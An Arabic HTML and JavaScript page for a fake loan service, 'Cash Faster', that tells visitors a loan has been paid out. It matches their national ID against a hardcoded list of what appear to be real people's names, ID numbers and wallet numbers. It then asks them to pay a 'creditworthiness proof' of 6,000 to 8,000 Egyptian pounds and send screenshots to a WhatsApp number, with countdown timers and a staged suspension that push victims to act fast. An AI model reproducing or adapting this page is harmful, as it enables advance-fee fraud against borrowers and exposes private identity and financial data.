<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>كاش فاستر | تم الدفع - إثبات الجدارة</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --bg-deep: #0B0E17;
            --card-bg: #10131F;
            --border-cyan: #00E5FF;
            --neon-gold: #FFD966;
            --neon-purple: #B85CFF;
            --text-white: #FFFFFF;
            --text-dim: #A9B2D0;
            --glow-cyan: 0 0 12px #00E5FF;
            --glow-gold: 0 0 12px #FFD966;
        }
        body {
            font-family: 'Cairo', sans-serif;
            background: radial-gradient(circle at 30% 10%, #0C1020, #020408);
            color: var(--text-white);
            min-height: 100vh;
            position: relative;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background-image: linear-gradient(rgba(0, 229, 255, 0.05) 1px, transparent 1px),
                              linear-gradient(90deg, rgba(0, 229, 255, 0.05) 1px, transparent 1px);
            background-size: 45px 45px;
            pointer-events: none;
            z-index: 0;
        }
        .container { max-width: 1100px; margin: 0 auto; padding: 1.2rem; position: relative; z-index: 2; }
        .hero {
            background: linear-gradient(135deg, rgba(0, 229, 255, 0.1), rgba(184, 92, 255, 0.05));
            backdrop-filter: blur(12px);
            border: 1px solid var(--border-cyan);
            border-radius: 2rem;
            padding: 0.8rem 1.5rem;
            margin-bottom: 1.8rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            box-shadow: 0 0 12px #00E5FF;
        }
        .hero-badge { font-size: 1.2rem; font-weight: 700; color: var(--border-cyan); }
        .hero-badge span { background: #00E5FF20; padding: 0.3rem 0.8rem; border-radius: 2rem; }
        .hero-title { font-size: 1.1rem; font-weight: 600; color: var(--neon-gold); }
        .search-card {
            background: rgba(16, 19, 35, 0.85);
            backdrop-filter: blur(12px);
            border: 1px solid var(--border-cyan);
            border-radius: 2rem;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }
        .input-id {
            width: 100%;
            padding: 0.9rem;
            background: #010116;
            border: 2px solid var(--border-cyan);
            border-radius: 3rem;
            color: white;
            text-align: center;
            font-size: 1rem;
        }
        .btn-search {
            background: linear-gradient(95deg, var(--border-cyan), var(--neon-purple));
            border: none;
            padding: 0.8rem;
            border-radius: 3rem;
            font-weight: 800;
            width: 100%;
            max-width: 280px;
            margin: 1rem auto 0;
            display: block;
            cursor: pointer;
            color: white;
        }
        .suspended-card {
            background: linear-gradient(145deg, #1A1120, #0D0712);
            border: 2px solid #FF8C42;
            border-radius: 2rem;
            padding: 1.8rem;
            text-align: center;
        }
        .timer-glow {
            background: radial-gradient(circle, rgba(255,217,102,0.15), transparent);
            border: 1px solid var(--neon-gold);
            border-radius: 2rem;
            text-align: center;
            padding: 1rem;
            margin: 1rem 0;
            animation: pulseGold 1.2s infinite alternate;
        }
        @keyframes pulseGold {
            0% { box-shadow: 0 0 5px var(--neon-gold); }
            100% { box-shadow: 0 0 20px var(--neon-gold); }
        }
        .timer {
            font-family: monospace;
            font-size: 2.8rem;
            font-weight: 800;
            background: #000000aa;
            display: inline-block;
            padding: 0.3rem 1rem;
            border-radius: 2rem;
            color: var(--neon-gold);
            letter-spacing: 5px;
        }
        .step-box {
            background: rgba(0, 229, 255, 0.05);
            border-right: 4px solid var(--border-cyan);
            padding: 0.8rem;
            border-radius: 1rem;
            margin-bottom: 1rem;
            text-align: right;
        }
        .btn-whatsapp {
            background: #25D366;
            padding: 0.8rem 1.5rem;
            border-radius: 3rem;
            display: inline-flex;
            align-items: center;
            gap: 0.8rem;
            font-weight: bold;
            border: none;
            color: white;
            cursor: pointer;
            transition: 0.2s;
            width: 100%;
            justify-content: center;
        }
        .btn-whatsapp:hover { transform: scale(1.02); box-shadow: 0 0 18px #25D366; }
        .disabled-btn {
            background: #555;
            cursor: not-allowed;
            opacity: 0.6;
        }
        .disabled-btn:hover { transform: none; box-shadow: none; }
        .footer { text-align: center; font-size: 0.7rem; margin-top: 2rem; opacity: 0.6; }
        .error-card { background: rgba(255, 80, 80, 0.15); border: 1px solid #FF5E5E; border-radius: 2rem; padding: 2rem; text-align: center; display: none; }
        .loader { text-align: center; display: none; margin: 1rem; }
        .warning-badge {
            background: #FF4500AA;
            border-radius: 2rem;
            padding: 0.5rem;
            font-weight: bold;
            margin-top: 1rem;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="hero">
        <div class="hero-badge"><span><i class="fas fa-bolt"></i> EG222</span></div>
        <div class="hero-title">تم الدفع بنجاح <i class="fas fa-check-circle"></i></div>
    </div>

    <div class="search-card">
        <div style="font-weight: 700; margin-bottom: 0.5rem;"><i class="fas fa-id-card"></i> تحويل لحسابي الآن</div>
        <div style="font-size: 0.8rem; color: #A9B2D0; margin-bottom: 0.8rem;">أدخل رقم بطاقتك القومية (14 رقم)</div>
        <input type="text" id="nationalId" class="input-id" placeholder="مثال: 284121801258" maxlength="14" inputmode="numeric">
        <button class="btn-search" onclick="searchCustomer()"><i class="fas fa-exchange-alt"></i> حول لحسابي الآن</button>
        <div id="loader" style="text-align:center; margin-top:0.8rem; display:none;"><i class="fas fa-spinner fa-pulse fa-2x"></i></div>
    </div>

    <div id="resultSection"></div>
    <div id="errorCard" style="display: none;"></div>
    <div class="footer"><i class="fas fa-shield-alt"></i> جميع البيانات مشفرة | إثبات الجدارة لا يتطلب دفع أي أموال للشركة</div>
</div>

<script>
    // قاعدة بيانات العملاء (مختصرة لكن تحتوي على الجميع)
    const customersDatabase = {
        "28712102703133": { name: "عبد الرحيم احمد عبد الغفار ابو زيد", loan: 50000, wallet: "اتصالات كاش", walletNum: "01121600214", suspended: false, holdUntil: null, holdStarted: false, contactDone: false },
        "29006040102911": { name: "مصطفى ربيع عبد الحميد", loan: 40000, wallet: "فودافون كاش", walletNum: "01003165531", suspended: false },
        "29409010209751": { name: "انس محمد حسين محمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01009031820", suspended: false },
        "28705050203009": { name: "ياسمينا سامى محمد محمود محمد", loan: 50000, wallet: "فودافون كاش", walletNum: "01018004862", suspended: false },
        "26409111400958": { name: "مرعى زكى ابراهيم ابو النور", loan: 190000, wallet: "فودافون كاش", walletNum: "01012686294", suspended: false },
        "02805240200098": { name: "سعيد عوض محمد ادم", loan: 100000, wallet: "اتصالات كاش", walletNum: "01115891387", suspended: false },
        "27504082301097": { name: "محمد محمد على السيد", loan: 50000, wallet: "فودافون كاش", walletNum: "01030503094", suspended: false }
    };

    const WHATSAPP_NUMBER = "212780488542";
    const HOLD_DURATION_MS = 60 * 60 * 1000;      // ساعة كاملة
    const CONTACT_BEFORE_MS = 15 * 60 * 1000;     // 15 دقيقة قبل الإثبات

    let currentCustomer = null;
    let currentNationalId = null;
    let timerInterval = null;

    function formatTimeLeft(ms) {
        let totalSec = Math.floor(ms / 1000);
        let mins = Math.floor(totalSec / 60);
        let secs = totalSec % 60;
        return `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
    }

    function buildHoldMessage(customer, nationalId) {
        const now = Date.now();
        const holdUntil = customer.holdUntil;
        const timeLeft = holdUntil - now;
        const canContact = timeLeft <= (HOLD_DURATION_MS - CONTACT_BEFORE_MS) && timeLeft > 0;
        const contactExpired = timeLeft <= 0;

        let contactStatus = "";
        let btnDisabled = true;
        let btnText = "⏳ يرجى الانتظار...";

        if (contactExpired) {
            contactStatus = `<div class="warning-badge" style="background:#FF0000AA;">❌ انتهت مهلة التعليق (ساعة). تم إلغاء الطلب. يرجى التوجه للدعم.</div>`;
            btnText = "❌ الطلب ملغي";
        } else if (canContact) {
            contactStatus = `<div class="step-box" style="border-right-color:#25D366;"><i class="fab fa-whatsapp"></i> <strong>✅ يمكنك الآن إبلاغ التحويلات المالية</strong><br>يجب أن يتم الإبلاغ قبل إثبات الجدارة بـ 15 دقيقة. اضغط الزر أدناه للتواصل.</div>`;
            btnDisabled = false;
            btnText = "<i class='fab fa-whatsapp'></i> إبلاغ التحويلات المالية (فتح التعليق)";
        } else {
            const waitMs = HOLD_DURATION_MS - CONTACT_BEFORE_MS - (HOLD_DURATION_MS - timeLeft);
            const waitTime = formatTimeLeft(waitMs > 0 ? waitMs : 0);
            contactStatus = `<div class="step-box"><i class="fas fa-hourglass-half"></i> <strong>⏳ يجب الانتظار قبل الإبلاغ</strong><br>سيظهر زر الإبلاغ بعد <strong>${waitTime}</strong> من الآن. (يلزم الإبلاغ قبل الإثبات بـ 15 دقيقة)</div>`;
        }

        return `
            <div class="suspended-card">
                <i class="fas fa-ban" style="font-size:3rem; color:#FF8C42;"></i>
                <h2>⛔ طلبك معلق مؤقتاً</h2>
                <p><strong>${customer.name}</strong> ، تم تعليق طلب إثبات الجدارة لمدة ساعة بناءً على تعليمات النظام.</p>
                <div class="timer-glow">
                    <div><i class="fas fa-stopwatch"></i> الوقت المتبقي لإنهاء التعليق</div>
                    <div class="timer" id="holdTimer">${formatTimeLeft(timeLeft > 0 ? timeLeft : 0)}</div>
                    <div style="font-size:0.75rem;">بعد انقضاء الساعة، سيتم إلغاء الطلب تلقائياً.</div>
                </div>
                ${contactStatus}
                ${!contactExpired && !customer.contactDone ? `
                <button class="btn-whatsapp ${btnDisabled ? 'disabled-btn' : ''}" id="contactSupportBtn" ${btnDisabled ? 'disabled' : ''}>
                    ${btnText}
                </button>
                ` : ''}
                ${customer.contactDone ? `
                <div class="step-box" style="background:#00660040; border-right-color:#25D366;">
                    ✅ <strong>تم إبلاغ التحويلات المالية بنجاح</strong><br>يمكنك الآن متابعة إثبات الجدارة.
                </div>
                <button class="btn-whatsapp" id="proceedToProofBtn">
                    <i class="fas fa-check-circle"></i> المتابعة إلى إثبات الجدارة
                </button>
                ` : ''}
                <div class="step-box" style="margin-top:1rem;">
                    <i class="fas fa-info-circle"></i> <strong>هام:</strong> إذا قمت بإثبات الجدارة قبل الإبلاغ، سيتم رفض العملية وستضطر لإعادة المحاولة من جديد.
                </div>
            </div>
        `;
    }

    function startHoldTimer(customer, nationalId) {
        if (timerInterval) clearInterval(timerInterval);
        const timerEl = document.getElementById('holdTimer');
        if (!timerEl) return;

        timerInterval = setInterval(() => {
            const now = Date.now();
            const timeLeft = customer.holdUntil - now;
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                timerEl.innerText = "00:00";
                // إلغاء الطلب
                const section = document.getElementById('resultSection');
                section.innerHTML = `<div class="suspended-card" style="border-color:#FF0000;">
                    <i class="fas fa-times-circle" style="font-size:3rem; color:#FF0000;"></i>
                    <h2>❌ تم إلغاء الطلب</h2>
                    <p>انتهت مهلة الساعة دون إتمام الإجراءات. يرجى التواصل مع الدعم.</p>
                </div>`;
                return;
            }
            timerEl.innerText = formatTimeLeft(timeLeft);
            
            // تحديث حالة الزر إذا دخلنا نافذة الإبلاغ
            const contactBtn = document.getElementById('contactSupportBtn');
            if (contactBtn && !customer.contactDone) {
                const canContact = timeLeft <= (HOLD_DURATION_MS - CONTACT_BEFORE_MS);
                if (canContact && contactBtn.disabled) {
                    contactBtn.disabled = false;
                    contactBtn.classList.remove('disabled-btn');
                    contactBtn.innerHTML = "<i class='fab fa-whatsapp'></i> إبلاغ التحويلات المالية (فتح التعليق)";
                    // تحديث الرسالة النصية
                    const stepBox = document.querySelector('.step-box');
                    if (stepBox && stepBox.innerHTML.includes('يمكنك الآن')) return;
                    const container = document.getElementById('resultSection');
                    const newHtml = buildHoldMessage(customer, nationalId);
                    container.innerHTML = newHtml;
                    startHoldTimer(customer, nationalId);
                    attachContactEvents(customer, nationalId);
                }
            }
        }, 1000);
    }

    function attachContactEvents(customer, nationalId) {
        const contactBtn = document.getElementById('contactSupportBtn');
        if (contactBtn && !customer.contactDone) {
            contactBtn.onclick = () => {
                if (contactBtn.disabled) return;
                const msg = `📢 إبلاغ فتح التعليق\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nأبلغكم برغبتي في فتح الطلب وإكمال إثبات الجدارة.`;
                window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
                customer.contactDone = true;
                // تحديث الواجهة
                const section = document.getElementById('resultSection');
                section.innerHTML = buildHoldMessage(customer, nationalId);
                startHoldTimer(customer, nationalId);
                attachContactEvents(customer, nationalId);
            };
        }
        const proceedBtn = document.getElementById('proceedToProofBtn');
        if (proceedBtn) {
            proceedBtn.onclick = () => {
                if (customer.contactDone) {
                    // المتابعة إلى إثبات الجدارة
                    displayProofStage(customer, nationalId);
                } else {
                    alert("يجب إبلاغ التحويلات المالية أولاً!");
                }
            };
        }
    }

    function displayProofStage(customer, nationalId) {
        const proofAmount = customer.loan < 100000 ? 6000 : 8000;
        const refNum = Math.floor(Math.random()*1e9);
        const now = new Date();
        const html = `
            <div class="payment-card" style="background: linear-gradient(145deg, #11162B, #0A0D1C); border:1px solid #00E5FF; border-radius:2rem; padding:1.8rem;">
                <div class="payment-header">
                    <h2><i class="fas fa-check-circle"></i> تم الدفع بنجاح</h2>
                    <p>رقم المعاملة: TX-${refNum}</p>
                </div>
                <div class="amount-block" style="background:rgba(0,229,255,0.08); border-radius:1.8rem; text-align:center; padding:1rem;">
                    <div class="amount-label">المبلغ المدفوع</div>
                    <div class="amount-value" style="font-size:2.8rem; font-weight:800; color:#FFD966;">${customer.loan.toLocaleString('ar-EG')} ج.م</div>
                </div>
                <div class="details-grid" style="display:grid; grid-template-columns:1fr 1fr; gap:0.8rem; background:#00000040; padding:1rem; border-radius:1.5rem;">
                    <div class="detail-item"><span><i class="fas fa-wallet"></i> طريقة الدفع</span><span>${customer.wallet}</span></div>
                    <div class="detail-item"><span><i class="fas fa-hashtag"></i> رقم المحفظة</span><span>${customer.walletNum}</span></div>
                    <div class="detail-item"><span><i class="fas fa-calendar"></i> التاريخ والوقت</span><span>${new Date().toLocaleDateString('ar-EG')} - ${new Date().toLocaleTimeString('ar-EG')}</span></div>
                </div>
                <div class="info-message" style="background:rgba(255,217,102,0.12); border-right:3px solid #FFD966; padding:0.8rem; border-radius:1rem;">
                    <i class="fas fa-hourglass-half"></i> <strong>جارٍ حصولك على صرف المبلغ فور الإثبات</strong><br>
                    سيتم تسليم المبلغ خلال 30 دقيقة بعد الإثبات.
                </div>
                <div class="timer-glow">
                    <div><i class="fas fa-stopwatch"></i> الوقت المتبقي لتسليم المبلغ</div>
                    <div class="timer" id="deliveryTimer">30:00</div>
                </div>
            </div>
            <div class="credit-card" style="background:linear-gradient(145deg,#11162B,#0A0D1C); border:1px solid #B85CFF; border-radius:2rem; padding:1.5rem;">
                <h3 style="color:#00E5FF;"><i class="fas fa-chart-line"></i> إثبات الجدارة الائتمانية</h3>
                <div class="step-box"><strong>💡 ما هي الجدارة؟</strong><br>إجراء أمني لتأكيد ملكية المحفظة.</div>
                <div class="step-box">🔹 المبلغ المطلوب لإثبات الجدارة: <span style="color:#FFD966; font-weight:bold;">${proofAmount.toLocaleString('ar-EG')} ج.م</span></div>
                <div class="step-box">📌 الخطوات:<br>1- اطلب من شخص تثق به تحويل المبلغ إلى محفظتك.<br>2- التقط لقطة شاشة توضح المبلغ داخل رصيدك.<br>3- قم بتحويل نفس المبلغ مرة أخرى إلى نفس الشخص.<br>4- التقط لقطة شاشة ثانية لخروج المبلغ.<br>5- أرسل الصورتين عبر الواتساب إلى فريق Cash Faster.</div>
                <button class="btn-whatsapp" onclick="openWhatsAppForProof('${customer.name.replace(/'/g, "\\'")}', '${nationalId}', ${proofAmount})">
                    <i class="fab fa-whatsapp fa-lg"></i> إرسال صور الإثبات والتحقق الفوري
                </button>
            </div>
        `;
        document.getElementById('resultSection').innerHTML = html;
        startDeliveryTimer();
    }

    function startDeliveryTimer() {
        let secondsLeft = 30 * 60;
        const timerEl = document.getElementById('deliveryTimer');
        if (!timerEl) return;
        const interval = setInterval(() => {
            if (secondsLeft <= 0) {
                clearInterval(interval);
                timerEl.innerText = "00:00";
                alert("انتهت المهلة المحددة للإثبات. سيتم إلغاء العملية.");
            } else {
                secondsLeft--;
                const mins = Math.floor(secondsLeft / 60);
                const secs = secondsLeft % 60;
                timerEl.innerText = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
            }
        }, 1000);
    }

    function openWhatsAppForProof(name, id, amount) {
        const msg = `السلام عليكم\nالعميل: ${name}\nالرقم القومي: ${id}\nسأقوم بإرسال صورتي الإيداع والخروج لإثبات الجدارة بمبلغ ${amount.toLocaleString('ar-EG')} ج.م.`;
        window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
    }

    function searchCustomer() {
        const nationalId = document.getElementById('nationalId').value.trim();
        if (!nationalId) { alert('الرجاء إدخال الرقم القومي'); return; }
        if (nationalId.length !== 14) { alert('الرقم القومي 14 رقم'); return; }
        document.getElementById('loader').style.display = 'block';
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            const customer = customersDatabase[nationalId];
            if (!customer) {
                document.getElementById('resultSection').innerHTML = '';
                const errDiv = document.getElementById('errorCard');
                errDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> الرقم القومي غير مسجل. تواصل مع الدعم.';
                errDiv.style.display = 'block';
                return;
            }
            currentCustomer = customer;
            currentNationalId = nationalId;

            // حالة خاصة لعبد الرحيم احمد
            if (nationalId === "28712102703133") {
                if (!customer.holdUntil) {
                    customer.holdUntil = Date.now() + HOLD_DURATION_MS;
                    customer.contactDone = false;
                }
                const now = Date.now();
                if (now >= customer.holdUntil) {
                    document.getElementById('resultSection').innerHTML = `<div class="suspended-card" style="border-color:#FF0000;">
                        <i class="fas fa-times-circle" style="font-size:3rem; color:#FF0000;"></i>
                        <h2>❌ تم إلغاء الطلب</h2>
                        <p>انتهت مهلة الساعة دون إتمام الإجراءات. يرجى التواصل مع الدعم.</p>
                    </div>`;
                    return;
                }
                const html = buildHoldMessage(customer, nationalId);
                document.getElementById('resultSection').innerHTML = html;
                startHoldTimer(customer, nationalId);
                attachContactEvents(customer, nationalId);
                document.getElementById('errorCard').style.display = 'none';
                return;
            }

            // باقي العملاء بشكل طبيعي
            displayProofStage(customer, nationalId);
            document.getElementById('errorCard').style.display = 'none';
        }, 800);
    }

    window.searchCustomer = searchCustomer;
    window.openWhatsAppForProof = openWhatsAppForProof;
</script>
</body>
</html>
